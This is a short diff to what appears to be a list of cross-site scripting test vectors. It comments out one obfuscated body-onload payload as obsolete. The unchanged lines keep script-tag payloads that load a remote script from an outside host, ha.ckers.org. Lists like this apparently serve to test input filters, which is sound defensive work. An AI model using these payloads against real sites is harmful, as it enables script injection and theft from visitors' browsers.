@@ -85,7 +85,10 @@
 
 # Non-alpha-non-digit XS
 <SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+
+# this is bogus or obsolete
+# <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+
 <SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 
 # Extraneous open brackets
